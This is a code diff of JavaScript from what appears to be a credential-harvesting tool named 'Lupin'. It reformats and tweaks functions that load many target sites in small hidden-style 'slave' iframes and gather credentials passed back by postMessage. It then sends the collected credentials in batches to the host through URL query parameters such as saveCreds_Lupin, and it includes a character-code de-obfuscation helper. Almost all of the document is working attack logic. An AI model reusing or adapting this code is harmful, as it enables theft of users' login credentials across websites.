@@ -10,15 +10,15 @@ var numSlaves;
 var targetIndexArray;
 var chunkLenArray;
 
-
-
            
-function deobfs(string){
+function deobfs(string)
+{
 	var nums = string.split(".")
         var deobfs = "";
 	var k;
            
-        for (i=0; i<nums.length; i+=1){
+        for (i=0; i<nums.length; i+=1)
+	{
         	k = parseInt(nums[i])-255;
                 deobfs+=String.fromCharCode(k);
         }
@@ -26,9 +26,8 @@ function deobfs(string){
 }
 
 
-function moveSrc(slaveFrameNum){
-
-
+function moveSrc(slaveFrameNum)
+{
 	var slaveFrameName = "slaveFrame"+slaveFrameNum.toString();
         var slaveFrame= document.getElementsByName(slaveFrameName)[0]; 
 	var src = targets[targetIndexArray[slaveFrameNum]];
@@ -38,17 +37,17 @@ function moveSrc(slaveFrameNum){
 }
 
 
-function createSlaveFrame(slaveFrameNum) { 
-
+function createSlaveFrame(slaveFrameNum)
+{ 
 	var slaveFrame = document.createElement("IFRAME"); 
-
         slaveFrame.setAttribute("height", "100");
         slaveFrame.setAttribute("width", "100");
         slaveFrame.setAttribute("id", "slaveFrame"+slaveFrameNum.toString());
         slaveFrame.setAttribute("name", "slaveFrame"+slaveFrameNum.toString());
 
-	if (slaveFrameNum == -1){ 
-        	slaveFrame.setAttribute("src","http://"+document.location.hostname+"?Lupin=NOTHING");         
+	if (slaveFrameNum == -1)
+	{
+        	slaveFrame.setAttribute("src","http://"+document.location.hostname+"?sendOK_Lupin=1");         
         }
       	document.body.appendChild(slaveFrame); 
 	
@@ -56,20 +55,25 @@ function createSlaveFrame(slaveFrameNum) {
 } 
 
 
-function advanceSlaves(){
-	if(pause == true ){
+function advanceSlaves()
+{
+	if(pause == true )
+	{
 		return;
 	}
-
 	
 	check=0;
-	for(var i=0; i<numSlaves;i++){
-		if(targetIndexArray[i] < chunkLenArray[i]){
+	for(var i=0; i<numSlaves;i++)
+	{
+		if(targetIndexArray[i] < chunkLenArray[i])
+		{
 			
-			if (check >=0 && check < checkLimit){
+			if (check >=0 && check < checkLimit)
+			{
 				check+=1;
 				moveSrc(i);
-			}else{
+			}else
+			{
 				check = -1;
 				continue;
 			}
@@ -82,12 +86,15 @@ function advanceSlaves(){
 
        
            
-function onMessage (event){
+function onMessage (event)
+{
 	var m = event.data;
-	if(m.indexOf("focus") != -1){
+	if(m.indexOf("focus") != -1)
+	{
 		pause = true;
 		return;
-	}else if(m.indexOf("blur") != -1){
+	}else if(m.indexOf("blur") != -1)
+	{
 		pause = false;
 		advanceSlaves();
 		return;
@@ -102,46 +109,52 @@ function onMessage (event){
 	var credCount;
 	var moved;
 	
-        if (m != ""){
+        if (m != "")
+	{
 	        creds+="|"+arr[0]+"|"+arr[1]+"|"+arr[2]+"|||||";
 
         }
       
-	if(check >= 0 && check < checkLimit){
-		if(targetIndexArray[slaveFrameNum] < chunkLenArray[slaveFrameNum]){
-			if (pause == false){
+	if(check >= 0 && check < checkLimit)
+	{
+		if(targetIndexArray[slaveFrameNum] < chunkLenArray[slaveFrameNum])
+		{
+			if (pause == false)
+			{
 				moveSrc(slaveFrameNum);
 				check+=1;
 			}
 		}
-	}else{
+	}else
+	{
 		check = -1;
 	}
 
-        if(targetIndexArray[slaveFrameNum] == chunkLenArray[slaveFrameNum]){
+        if(targetIndexArray[slaveFrameNum] == chunkLenArray[slaveFrameNum])
+	{
 	        finishedSlaves+=1;
+		alert(finishedSlaves);
         }
   	
         cut = creds.lastIndexOf("|||||");
-        if(finishedSlaves == numSlaves){
-	        if(cut > -1){     
-
-			src = "http://"+document.location.hostname+"?Lupin=1&creds=";
-                	sendFrame = document.getElementsByName("slaveFrame-1")[0];
-                	sendFrame.setAttribute('src',src+creds.substring(0,cut));               
+        if(finishedSlaves == numSlaves)
+	{
+		src = "http://"+document.location.hostname+"?sendCleanUp_Lupin=1";		
+	        if(cut > -1)
+		{     
+			src = src+"&saveCreds_Lupin="+creds.substring(0,cut);
 		}
-		src = "http://"+document.location.hostname+"?Lupin=KILL";
-		document.location.replace(src); 
-		//sendFrame = document.getElementsByName("slaveFrame-1")[0];
-                //sendFrame.setAttribute('src',src);         
+		alert(src);
+	        document.location.replace(src);        
 		return;  
-        }else{   
+        }else
+	{   
 		credCount = creds.split("|||||").length - 1;
-
-                if(credCount == bundle) {   
-   	             src = "http://"+document.location.hostname+"?Lupin=1&creds=";
+                if(credCount == bundle)
+		{   
                      sendFrame = document.getElementsByName("slaveFrame-1")[0];
-                     sendFrame.setAttribute('src',src+creds.substring(0,cut));               
+   	             src = "http://"+document.location.hostname+"?sendOK_Lupin=1&saveCreds_Lupin="+creds.substring(0,cut);
+                     sendFrame.setAttribute('src',src);               
                      creds = "";
                }
         }  
@@ -151,12 +164,14 @@ function onMessage (event){
 
 
 
-function init(){
-
+function init()
+{
 	var rem;
-	if(targets.length > maxSlaves){
+	if(targets.length > maxSlaves)
+	{
 		numSlaves = maxSlaves;
-	}else{
+	}else
+	{
 		numSlaves = targets.length;
 	}
  
@@ -167,16 +182,19 @@ function init(){
 
       	tmp = 0;
 	rem = targets.length - numSlaves*chunkLen;
-       	for(var i=0; i<numSlaves;i++){
+       	for(var i=0; i<numSlaves;i++)
+	{
        		targetIndexArray[i] = tmp;
     		tmp += chunkLen;
-		if(i<rem){
+		if(i<rem)
+		{
 			tmp+=1;
     		}
 		chunkLenArray[i] = tmp;
        	}
 	
-	for(var i=-1;i<numSlaves;i+=1){
+	for(var i=-1;i<numSlaves;i+=1)
+	{
                 createSlaveFrame(i);
       	}
 
